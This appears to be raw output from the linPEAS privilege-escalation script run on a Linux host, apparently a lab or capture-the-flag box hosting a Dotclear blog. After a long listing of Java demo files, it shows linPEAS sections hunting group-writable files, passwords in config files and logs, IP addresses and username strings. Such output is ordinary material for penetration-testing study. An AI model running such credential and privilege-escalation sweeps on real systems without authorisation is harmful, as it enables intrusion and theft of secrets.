+/srv/java/demo/jfc/Java2D/src/java2d/GlobalControls.java
+/srv/java/demo/jfc/Java2D/src/java2d/GlobalPanel.java
+/srv/java/demo/jfc/Java2D/src/java2d/Intro.java
+/srv/java/demo/jfc/Java2D/src/java2d/Java2DemoApplet.java
+/srv/java/demo/jfc/Java2D/src/java2d/Java2Demo.java
+/srv/java/demo/jfc/Java2D/src/java2d/MemoryMonitor.java
+/srv/java/demo/jfc/Java2D/src/java2d/PerformanceMonitor.java
+/srv/java/demo/jfc/Java2D/src/java2d/RunWindow.java
+/srv/java/demo/jfc/Java2D/src/java2d/Surface.java
+/srv/java/demo/jfc/Java2D/src/java2d/TextureChooser.java
+/srv/java/demo/jfc/Java2D/src/java2d/Tools.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/jfc/Metalworks/Metalworks.jar
+/srv/java/demo/jfc/Metalworks/README.txt
+/srv/java/demo/jfc/Metalworks/src
+/srv/java/demo/jfc/Metalworks/src/AquaMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/BigContrastMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/ContrastMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/DemoMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/GreenMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/KhakiMetalTheme.java
+/srv/java/demo/jfc/Metalworks/src/MetalThemeMenu.java
+/srv/java/demo/jfc/Metalworks/src/MetalworksDocumentFrame.java
+/srv/java/demo/jfc/Metalworks/src/MetalworksFrame.java
+/srv/java/demo/jfc/Metalworks/src/MetalworksHelp.java
+/srv/java/demo/jfc/Metalworks/src/MetalworksInBox.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/jfc/Metalworks/src/resources/HelpFiles/credits.html
+/srv/java/demo/jfc/Metalworks/src/resources/HelpFiles/metal.html
+/srv/java/demo/jfc/Metalworks/src/resources/HelpFiles/metalworks.html
+/srv/java/demo/jfc/Metalworks/src/resources/HelpFiles/swing.html
+/srv/java/demo/jfc/Metalworks/src/resources/HelpFiles/toc.html
+/srv/java/demo/jfc/Metalworks/src/resources/MyTheme.theme
+/srv/java/demo/jfc/Metalworks/src/UISwitchListener.java
+/srv/java/demo/jfc/Notepad
+/srv/java/demo/jfc/Notepad/Notepad.jar
+/srv/java/demo/jfc/Notepad/README.txt
+/srv/java/demo/jfc/Notepad/src
+/srv/java/demo/jfc/Notepad/src/ElementTreePanel.java
+/srv/java/demo/jfc/Notepad/src/Notepad.java
+/srv/java/demo/jfc/Notepad/src/resources
+/srv/java/demo/jfc/Notepad/src/resources/Notepad_fr.properties
+/srv/java/demo/jfc/Notepad/src/resources/Notepad.properties
+/srv/java/demo/jfc/Notepad/src/resources/Notepad_sv.properties
+/srv/java/demo/jfc/Notepad/src/resources/Notepad_zh_CN.properties
+/srv/java/demo/jfc/SampleTree
+/srv/java/demo/jfc/SampleTree/README.txt
+/srv/java/demo/jfc/SampleTree/SampleTree.jar
+/srv/java/demo/jfc/SampleTree/src
+/srv/java/demo/jfc/SampleTree/src/DynamicTreeNode.java
+/srv/java/demo/jfc/SampleTree/src/resources
+/srv/java/demo/jfc/SampleTree/src/resources/images
+/srv/java/demo/jfc/SampleTree/src/SampleData.java
+/srv/java/demo/jfc/SampleTree/src/SampleTreeCellRenderer.java
+/srv/java/demo/jfc/SampleTree/src/SampleTree.java
+/srv/java/demo/jfc/SampleTree/src/SampleTreeModel.java
+/srv/java/demo/jfc/Stylepad
+/srv/java/demo/jfc/Stylepad/README.txt
+/srv/java/demo/jfc/Stylepad/src
+/srv/java/demo/jfc/Stylepad/src/ElementTreePanel.java
+/srv/java/demo/jfc/Stylepad/src/HelloWorld.java
+/srv/java/demo/jfc/Stylepad/src/Notepad.java
+/srv/java/demo/jfc/Stylepad/src/resources
+/srv/java/demo/jfc/Stylepad/src/resources/Notepad_fr.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Notepad.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Notepad_sv.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Notepad_zh_CN.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Stylepad.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Stylepad_sv.properties
+/srv/java/demo/jfc/Stylepad/src/resources/Stylepad_zh_CN.properties
+/srv/java/demo/jfc/Stylepad/src/Stylepad.java
+/srv/java/demo/jfc/Stylepad/src/Wonderland.java
+/srv/java/demo/jfc/Stylepad/Stylepad.jar
+/srv/java/demo/jfc/SwingApplet
+/srv/java/demo/jfc/SwingApplet/README.txt
+/srv/java/demo/jfc/SwingApplet/src
+/srv/java/demo/jfc/SwingApplet/src/SwingApplet.java
+/srv/java/demo/jfc/SwingApplet/SwingApplet.html
+/srv/java/demo/jfc/SwingApplet/SwingApplet.jar
+/srv/java/demo/jfc/SwingSet2
+/srv/java/demo/jfc/SwingSet2/README.txt
+/srv/java/demo/jfc/SwingSet2/src
+/srv/java/demo/jfc/SwingSet2/src/AquaTheme.java
+/srv/java/demo/jfc/SwingSet2/src/BezierAnimationPanel.java
+/srv/java/demo/jfc/SwingSet2/src/ButtonDemo.java
+/srv/java/demo/jfc/SwingSet2/src/CharcoalTheme.java
+/srv/java/demo/jfc/SwingSet2/src/CodeViewer.java
+/srv/java/demo/jfc/SwingSet2/src/ColorChooserDemo.java
+/srv/java/demo/jfc/SwingSet2/src/ComboBoxDemo.java
+/srv/java/demo/jfc/SwingSet2/src/ContrastTheme.java
+/srv/java/demo/jfc/SwingSet2/src/DemoModule.java
+/srv/java/demo/jfc/SwingSet2/src/DirectionPanel.java
+/srv/java/demo/jfc/SwingSet2/src/EmeraldTheme.java
+#)You_can_write_even_more_files_inside_last_directory
+/srv/java/demo/jfc/SwingSet2/src/resources/bug.html
+/srv/java/demo/jfc/SwingSet2/src/resources/images
+/srv/java/demo/jfc/SwingSet2/src/resources/images/buttons
+/srv/java/demo/jfc/SwingSet2/src/resources/images/combobox
+/srv/java/demo/jfc/SwingSet2/src/resources/images/filechooser
+/srv/java/demo/jfc/SwingSet2/src/resources/images/htmldemo
+/srv/java/demo/jfc/SwingSet2/src/resources/images/ImageClub
+/srv/java/demo/jfc/SwingSet2/src/resources/images/ImageClub/COPYRIGHT
+/srv/java/demo/jfc/SwingSet2/src/resources/images/ImageClub/food
+/srv/java/demo/jfc/SwingSet2/src/resources/images/ImageClub/misc
+/srv/java/demo/jfc/SwingSet2/src/resources/images/list
+/srv/java/demo/jfc/SwingSet2/src/resources/images/Octavo
+/srv/java/demo/jfc/SwingSet2/src/resources/images/Octavo/COPYRIGHT
+/srv/java/demo/jfc/SwingSet2/src/resources/images/optionpane
+/srv/java/demo/jfc/SwingSet2/src/resources/images/scrollpane
+/srv/java/demo/jfc/SwingSet2/src/resources/images/scrollpane/COPYRIGHT
+/srv/java/demo/jfc/SwingSet2/src/resources/images/splitpane
+/srv/java/demo/jfc/SwingSet2/src/resources/images/splitpane/README
+/srv/java/demo/jfc/SwingSet2/src/resources/images/tabbedpane
+/srv/java/demo/jfc/SwingSet2/src/resources/images/toolbar
+/srv/java/demo/jfc/SwingSet2/src/resources/images/tooltip
+/srv/java/demo/jfc/SwingSet2/src/resources/index.html
+/srv/java/demo/jfc/SwingSet2/src/resources/king.html
+/srv/java/demo/jfc/SwingSet2/src/resources/preface.html
+/srv/java/demo/jfc/SwingSet2/src/resources/seaweed.html
+/srv/java/demo/jfc/SwingSet2/src/resources/swingset_ja.properties
+/srv/java/demo/jfc/SwingSet2/src/resources/swingset.properties
+/srv/java/demo/jfc/SwingSet2/src/resources/title.html
+/srv/java/demo/jfc/SwingSet2/src/resources/tree.txt
+/srv/java/demo/jfc/SwingSet2/src/RubyTheme.java
+/srv/java/demo/jfc/SwingSet2/src/ScrollPaneDemo.java
+/srv/java/demo/jfc/SwingSet2/src/SliderDemo.java
+/srv/java/demo/jfc/SwingSet2/src/SplitPaneDemo.java
+/srv/java/demo/jfc/SwingSet2/src/SwingSet2Applet.java
+/srv/java/demo/jfc/SwingSet2/src/SwingSet2.java
+/srv/java/demo/jfc/SwingSet2/src/TabbedPaneDemo.java
+/srv/java/demo/jfc/SwingSet2/src/TableDemo.java
+/srv/java/demo/jfc/SwingSet2/src/ToolTipDemo.java
+/srv/java/demo/jfc/SwingSet2/src/TreeDemo.java
+/srv/java/demo/jfc/SwingSet2/SwingSet2.html
+/srv/java/demo/jfc/SwingSet2/SwingSet2.jar
+/srv/java/demo/jfc/TableExample
+/srv/java/demo/jfc/TableExample/README.txt
+/srv/java/demo/jfc/TableExample/src
+/srv/java/demo/jfc/TableExample/src/JDBCAdapter.java
+/srv/java/demo/jfc/TableExample/src/OldJTable.java
+/srv/java/demo/jfc/TableExample/src/TableExample2.java
+/srv/java/demo/jfc/TableExample/src/TableExample3.java
+/srv/java/demo/jfc/TableExample/src/TableExample4.java
+/srv/java/demo/jfc/TableExample/src/TableExample.java
+/srv/java/demo/jfc/TableExample/src/TableMap.java
+/srv/java/demo/jfc/TableExample/src/TableSorter.java
+/srv/java/demo/jfc/TableExample/TableExample.jar
+/srv/java/demo/jpda
+/srv/java/demo/jpda/examples.jar
+/srv/java/demo/jvmti
+/srv/java/demo/jvmti/agent_util
+/srv/java/demo/jvmti/agent_util/README.txt
+/srv/java/demo/jvmti/agent_util/src
+/srv/java/demo/jvmti/agent_util/src/agent_util.c
+/srv/java/demo/jvmti/agent_util/src/agent_util.h
+/srv/java/demo/jvmti/gctest
+/srv/java/demo/jvmti/gctest/lib
+/srv/java/demo/jvmti/gctest/lib/libgctest_g.so
+/srv/java/demo/jvmti/gctest/lib/libgctest.so
+/srv/java/demo/jvmti/gctest/README.txt
+/srv/java/demo/jvmti/gctest/src
+/srv/java/demo/jvmti/gctest/src/gctest.c
+/srv/java/demo/jvmti/gctest/src/sample.makefile.txt
+/srv/java/demo/jvmti/heapTracker
+/srv/java/demo/jvmti/heapTracker/heapTracker.jar
+/srv/java/demo/jvmti/heapTracker/lib
+/srv/java/demo/jvmti/heapTracker/lib/libheapTracker_g.so
+/srv/java/demo/jvmti/heapTracker/lib/libheapTracker.so
+/srv/java/demo/jvmti/heapTracker/README.txt
+/srv/java/demo/jvmti/heapTracker/src
+/srv/java/demo/jvmti/heapTracker/src/heapTracker.c
+/srv/java/demo/jvmti/heapTracker/src/heapTracker.h
+/srv/java/demo/jvmti/heapTracker/src/HeapTracker.java
+/srv/java/demo/jvmti/heapTracker/src/sample.makefile.txt
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group jacob:
+/dev/mqueue/linpeas.txt28118
+/dev/shm/linpeas.sh
+
+[+] Searching passwords in config PHP files
+define('DC_DBPASSWORD','');
+
+[+] Finding IPs inside logs (limit 70)
+     11 /var/log/wtmp:192.168.150.1
+      1 /var/log/lastlog:192.168.150.1
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/dmesg:[    1.544174] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/dmesg.old:[    1.864882] systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+
+[+] Finding emails inside logs (limit 70)
+      1 /var/log/dmesg.old:mockbuild@kbuilder.bsys.centos.org
+      1 /var/log/dmesg:mockbuild@kbuilder.bsys.centos.org
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/alternatives/mysqlbug:PASSWD="cat /etc/passwd"
+/etc/alternatives/mysqlbug:  $PASSWD | grep "^$LOGNAME:" | awk -F: '{print $5}' | sed -e 's/,.*//' > $TEMP
+/etc/nsswitch.conf.bak:passwd:     files sss
+/etc/nsswitch.conf:passwd:     files sss
+/etc/nsswitch.conf.rpmnew:passwd:     files sss
+/etc/pam.d/password-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/password-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth-ac:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pam.d/system-auth:password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+/etc/pki/tls/openssl.cnf:challengePassword		= A challenge password
+/etc/pki/tls/openssl.cnf:challengePassword_max		= 20
+/etc/pki/tls/openssl.cnf:challengePassword_min		= 4
+/etc/samba/smb.conf.example:;	password server = <NT-Server-Name>
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/selinux/semanage.conf:usepasswd=False
+/etc/selinux/targeted/contexts/files/file_contexts:/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/dovecot\.passwd.*	system_u:object_r:dovecot_passwd_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/group[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.adjunct.*	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd\.OLD	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/passwd[-\+]?	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/ptmptmp	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/\.pwd\.lock	--	system_u:object_r:passwd_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/rc\.d/init\.d/yppasswd	--	system_u:object_r:nis_initrc_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/samba/smbpasswd	--	system_u:object_r:samba_secrets_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd\.old	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/etc/security/opasswd	--	system_u:object_r:shadow_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/opt/vmware/(workstation|player)/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/chage	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/passwd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-gnome-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/systemd-tty-ask-password-agent	--	system_u:object_r:systemd_passwd_agent_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd\.bin	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/bin/vmware-smbpasswd	--	system_u:object_r:vmware_host_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/libexec/httpd-ssl-pass-dialog	--	system_u:object_r:httpd_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/systemd/system/yppasswdd.*	--	system_u:object_r:nis_unit_file_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/chpasswd	--	system_u:object_r:passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/gpasswd	--	system_u:object_r:groupadd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/grpunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwhistory_helper	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/pwunconv	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd\.env	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/rpc\.yppasswdd	--	system_u:object_r:yppasswdd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_chkpwd	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_update	--	system_u:object_r:updpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/unix_verify	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/validate	--	system_u:object_r:chkpwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vigr	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/sbin/vipw	--	system_u:object_r:admin_passwd_exec_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/system-config-rootpassword/system-config-rootpassword	--	system_u:object_r:bin_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password-block(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/systemd/ask-password(/.*)?	system_u:object_r:systemd_passwd_var_run_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/run/yppass.*	--	system_u:object_r:yppasswdd_var_run_t:s0
+/etc/sysconfig/authconfig:PASSWDALGORITHM=md5
+/etc/sysconfig/authconfig:USEPASSWDQC=no
+/var/www/html/dotclear/admin/auth.php:            $change_pwd = false;
+/var/www/html/dotclear/admin/auth.php:            $change_pwd = true;
+/var/www/html/dotclear/admin/auth.php:    $check_user = $core->auth->checkUser($user_id, $user_pwd, $user_key, false) === true;
+
+[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/selinux/targeted/contexts/files/file_contexts.homedirs:/home/[^/]+/public_git(/.*)?	unconfined_u:object_r:git_user_content_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/lib/pgsql/test/regress(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/usr/share/jonas/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/pgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/postgres(ql)?(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/files/file_contexts:/var/lib/sepgsql(/.*)?	system_u:object_r:postgresql_db_t:s0
+/etc/selinux/targeted/contexts/sepgsql_contexts:db_database	*			system_u:object_r:sepgsql_db_t:s0
+/var/www/html/dotclear/admin/blog.php:    '<p><input type="submit" accesskey="s" name="create" value="' . __('Create') . '" /></p>' .
+/var/www/html/dotclear/admin/blog_pref.php:    '<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/category.php:        '<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/category.php:    '<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/category.php:'<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/comment.php:    '<input type="submit" accesskey="s" name="update" value="' . __('Save') . '" /> ';
+/var/www/html/dotclear/admin/install/wizard.php:        $admin_email = !empty($ADMINMAILFROM) ? $ADMINMAILFROM : 'dotclear@' . $_SERVER['HTTP_HOST'];
+/var/www/html/dotclear/admin/media_item.php:    '<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/post.php:        'accesskey="s" name="save" /> ';
+/var/www/html/dotclear/admin/preferences.php:'<input type="submit" accesskey="s" value="' . __('Save my dashboard options') . '" /></p>' .
+/var/www/html/dotclear/admin/preferences.php:'<input type="submit" accesskey="s" value="' . __('Save my options') . '" /></p>' .
+/var/www/html/dotclear/admin/preferences.php:'<input type="submit" accesskey="s" value="' . __('Update my profile') . '" /></p>' .
+/var/www/html/dotclear/admin/user.php:'<p class="clear"><input type="submit" name="save" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/admin/users_actions.php:    '<p><input type="submit" accesskey="s" value="' . __('Save') . '" />' .
+/var/www/html/dotclear/plugins/dcCKEditor/inc/dc.ckeditor.behaviors.php:            'img_select_accesskey' => __('m'),
+/var/www/html/dotclear/plugins/dcCKEditor/inc/dc.ckeditor.behaviors.php:            'link_accesskey'       => __('l'),
+/var/www/html/dotclear/plugins/dcLegacyEditor/inc/dc.legacy.editor.behaviors.php:                        'accesskey' => __('l'),
+/var/www/html/dotclear/plugins/dcLegacyEditor/inc/dc.legacy.editor.behaviors.php:                        'accesskey' => __('m')
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:        'db_host'    => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:        'db_pwd'     => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:        'db_user'    => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:                $this->vars['db_host']    = $_POST['db_host'];
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:                $this->vars['db_pwd']     = $_POST['db_pwd'];
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.dc1.php:                $this->vars['db_user']    = $_POST['db_user'];
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:        'db_host'            => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:        'db_pwd'             => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:        'db_user'            => '',
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:                $this->vars['db_host']          = $_POST['db_host'];
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:                $this->vars['db_pwd']           = $_POST['db_pwd'];
+/var/www/html/dotclear/plugins/importExport/inc/class.dc.import.wp.php:                $this->vars['db_user']          = $_POST['db_user'];
+/var/www/html/dotclear/plugins/pages/page.php:        'accesskey="s" name="save" /> ';
+/var/www/html/dotclear/plugins/themeEditor/index.php:        '<p><input type="submit" name="write" value="' . __('Save') . ' (s)" accesskey="s" /> ' .
+/var/www/html/dotclear/themes/ductile/_public.php:                        $img_url = $s['logo_src'];
+
+[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/libuser.conf:LU_USERNAME = %n
+/var/www/html/dotclear/admin/auth.php:        $page_url . "\n" . __('Username:') . ' ' . $user_id . "\n\n" .
+/var/www/html/dotclear/admin/auth.php:        '<p><label for="user_id">' . __('Username:') . '</label> ' .
+/var/www/html/dotclear/admin/auth.php:    '<p><label for="user_id">' . __('Username:') . '</label> ' .
+/var/www/html/dotclear/admin/auth.php:        __('Username:') . ' ' . $recover_res['user_id'] . "\n" .
+/var/www/html/dotclear/admin/install/index.php:    '<li>' . __('Username:') . ' <strong>' . html::escapeHTML($u_login) . '</strong></li>' .
+/var/www/html/dotclear/admin/users.php:    __('Username')          => 'user_id',
+/var/www/html/dotclear/inc/admin/lib.pager.php:            'username'     => '<td class="maximal" scope="row"><a href="' .
+/var/www/html/dotclear/inc/core/class.dc.xmlrpc.php:    public function wp_getOptions($blogid, $username, $password, $options = [])
+/var/www/html/dotclear/inc/core/class.dc.xmlrpc.php:    public function wp_getPages($blogid, $username, $password, $num = 10)
+/var/www/html/dotclear/inc/libs/clearbricks/net.http/class.net.http.php:            $this->username = $username;
+/var/www/html/dotclear/locales/en/main.lang.php:$GLOBALS['__l10n']['If you change your username, you will have to log in again.'] = '';
+/var/www/html/dotclear/locales/en/main.lang.php:$GLOBALS['__l10n']['Username:'] = '';
+/var/www/html/dotclear/locales/en/main.lang.php:$GLOBALS['__l10n']['Username'] = '';
+/var/www/html/dotclear/locales/en/main.lang.php:$GLOBALS['__l10n']['Username and password'] = '';
+/var/www/html/dotclear/locales/en/main.lang.php:$GLOBALS['__l10n']['Wrong username or password'] = '';
+/var/www/html/dotclear/locales/en/main.po:msgid "Username:"
+/var/www/html/dotclear/locales/fr/main.lang.php:$GLOBALS['__l10n']['Username and password'] = 'Identifiant et mot de passe';
+/var/www/html/dotclear/locales/fr/main.lang.php:$GLOBALS['__l10n']['Username'] = 'Identifiant';
+/var/www/html/dotclear/locales/fr/main.lang.php:$GLOBALS['__l10n']['Username:'] = 'Nom d\'utilisatrice ou d\'utilisateur :';
+/var/www/html/dotclear/locales/fr/main.po:msgid "Username:"
+
+[+] Looking for specific hashes inside files - less false positives (limit 70)
+
